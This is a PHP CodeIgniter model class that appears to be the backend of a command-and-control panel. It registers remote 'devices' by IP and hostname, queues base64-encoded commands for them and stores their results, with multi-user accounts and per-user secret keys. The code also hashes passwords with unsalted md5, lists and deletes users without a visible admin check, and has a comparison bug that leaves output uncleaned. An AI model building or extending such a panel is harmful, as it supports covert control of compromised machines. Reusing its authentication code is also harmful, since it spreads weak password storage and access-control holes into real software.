<?php
defined('BASEPATH') OR exit('No direct script access allowed');

class ConsoleHandler extends CI_Model {
	public function Index() {
		$data = array(
			'dev' => $this->db->query('SELECT count(*) AS cou FROM devices' )->result_array()[0]['cou'],
			'com' => $this->db->query('SELECT count(*) AS cou FROM commands')->result_array()[0]['cou'],
			'mem' => $this->db->query('SELECT count(*) AS cou FROM members' )->result_array()[0]['cou'],
			'sec' => $this->session->userdata('userinfo')['sec'],
			'pkt' => $this->session->userdata('userinfo')['pkt'],
		);
		return $data;
	}
	public function Devices_List() {
		$result['list'] = $this->db->query('SELECT cid, ack, rip, sip, hot, tim FROM devices WHERE sec = ?', $this->session->userdata('userinfo')['sec'])->result_array();
		foreach($result['list'] as $s => $v) {
			$result['list'][$s]['ack'] = $this->security->xss_clean($result['list'][$s]['ack']);
			$result['list'][$s]['sip'] = $this->security->xss_clean($result['list'][$s]['sip']);
			$result['list'][$s]['hot'] = $this->security->xss_clean($result['list'][$s]['hot']);
		}
		return $result;
	}
	public function Devices_Info($data) {
		$t = array($data, $this->session->userdata('userinfo')['sec']);
		$result = $this->db->query('SELECT * FROM devices WHERE ack = ? AND sec = ?', $t)->result_array();
		if(count($result)) {
			foreach($result[0] as $s => $v) {
				$result[0][$s] = $this->security->xss_clean($result[0][$s]);
			}
			return $result[0];
		} else {
			return array('cid' => 'None', 'sec' => 'None', 'ack' => 'None', 'rip' => 'None', 'sip' => 'None', 'hot' => 'None', 'ipc' => 'Tm9uZQ==', 'tim' => 'None');
		}
	}
	public function Devices_Delete($data) {
		$t = array($data, $this->session->userdata('userinfo')['sec']);
		return $this->db->query('DELETE FROM devices WHERE ack = ? AND sec = ?', $t);
	}
	public function Commands_List() {
		$result['list'] = $this->db->query('SELECT cid, ack, tim, act, fin FROM commands WHERE sec = ?', $this->session->userdata('userinfo')['sec'])->result_array();
		foreach($result['list'] as $s => $v) {
			$result['list'][$s]['ack'] == $this->security->xss_clean($result['list'][$s]['ack']);
			$result['list'][$s]['act'] == $this->security->xss_clean($result['list'][$s]['act']);
		}
		return $result;
	}
	public function Commands_Add($data) {
		$t = array($this->session->userdata('userinfo')['sec'], $data['ack'], date('Y-m-d H:i:s'), $data['act'], base64_encode($data['tex']));
		return $this->db->query('INSERT INTO commands (sec, ack, tim, act, tex) VALUES (?, ?, ?, ?, ?)', $t);
	}
	public function Commands_Info($data) {
		$t = array($data, $this->session->userdata('userinfo')['sec']);
		$result = $this->db->query('SELECT * FROM commands WHERE cid = ? AND sec = ?', $t)->result_array();
		if(count($result)) {
			foreach($result[0] as $s => $v) {
				$result[0][$s] = $this->security->xss_clean($result[0][$s]);
			}
			return $result[0];
		} else {
			return array('cid' => 'None', 'sec' => 'None', 'ack' => 'None', 'tim' => 'None', 'act' => 'None', 'tex' => 'Tm9uZQ==', 'res' => 'Tm9uZQ==', 'fin' => 'None');
		}
	}
	public function Commands_Delete($data) {
		$t = array($data, $this->session->userdata('userinfo')['sec']);
		return $this->db->query('DELETE FROM commands WHERE cid = ? AND sec = ?', $t);
	}
	public function Users_List() {
		$result['list'] = $this->db->query('SELECT cid, usr, ema, rip, tim FROM members')->result_array();
		return $result;
	}
	public function Users_Info($data) {
		return $this->db->query('SELECT * FROM members WHERE cid = ?', $data)->result_array()[0];
	}
	public function Users_Delete($data) {
		if($data == '1') return false;
		return $this->db->query('DELETE FROM members WHERE cid = ?', $data);
	}
	public function Profile($data) {
		if($data['pwd'] == '') {
			$t = array($data['ema'], $this->session->userdata('userinfo')['cid']);
			$data = $this->session->userdata('userinfo');
			$data['ema'] = $t[0];
			$this->session->set_userdata('userinfo', $data);
			return $this->db->query('UPDATE members SET ema = ? WHERE cid = ?', $t);
		} else {
			$t = array(md5($data['pwd']), $data['ema'], $this->session->userdata('userinfo')['cid']);
			$data = $this->session->userdata('userinfo');
			$data['pwd'] = $t[0];
			$data['ema'] = $t[1];
			$this->session->set_userdata('userinfo', $data);
			return $this->db->query('UPDATE members SET pwd = ?, ema = ? WHERE cid = ?', $t);
		}
	}
	public function Configs($data) {
		$str = base64_encode(json_encode(array(
			'sitename' => $data['sin'],
			'copyrights' => $data['cpr'],
			'register' => $data['reg'],
			'maintain' => $data['wwh'],
		)));
		$str = sprintf(read_file(APPPATH . 'config/config.tpl'), $str);
		return write_file(APPPATH . '../config.inc.php', $str, 'w');
	}
	public function Keys_SEC($data) {
		$t = array(random_string('alnum', 32), $data);
		$data = $this->session->userdata('userinfo');
		$data['sec'] = $t[0];
		$this->session->set_userdata('userinfo', $data);
		return $this->db->query('UPDATE members SET sec = ? WHERE cid = ?', $t);
	}
	public function Keys_PKT($data) {
		$t = array(random_string('alnum', 32), $data);
		$data = $this->session->userdata('userinfo');
		$data['pkt'] = $t[0];
		$this->session->set_userdata('userinfo', $data);
		return $this->db->query('UPDATE members SET pkt = ? WHERE cid = ?', $t);
	}
	public function Login($data) {
		$t = array($data['usr'], md5($data['pwd']));
		$result = $this->db->query('SELECT * FROM members WHERE usr = ? AND pwd = ?', $t)->result_array();
		if(count($result)) {
			$this->session->set_userdata('userinfo', $result[0]);
			$t = array($_SERVER['REMOTE_ADDR'], date('Y-m-d H:i:s'), $data['usr']);
			return $this->db->query('UPDATE members SET rip = ?, tim = ? WHERE usr = ?', $t);
		} else {
			return false;
		}
	}
	public function Register($data) {
		$t = array($data['usr'], $data['ema']);
		$result = $this->db->query('SELECT cid FROM members WHERE usr = ? OR ema = ?', $t)->result_array();
		if(count($result)) {
			return false;
		} else {
			$a = random_string('alnum', 32);
			$b = random_string('alnum', 32);
			$t = array($data['usr'], md5($data['pwd']), $data['ema'], $a, $b, $_SERVER['REMOTE_ADDR'], date('Y-m-d H:i:s'));
			return $this->db->query('INSERT INTO members (usr, pwd, ema, sec, pkt, rip, tim) VALUES (?, ?, ?, ?, ?, ?, ?)', $t);
		}
	}
}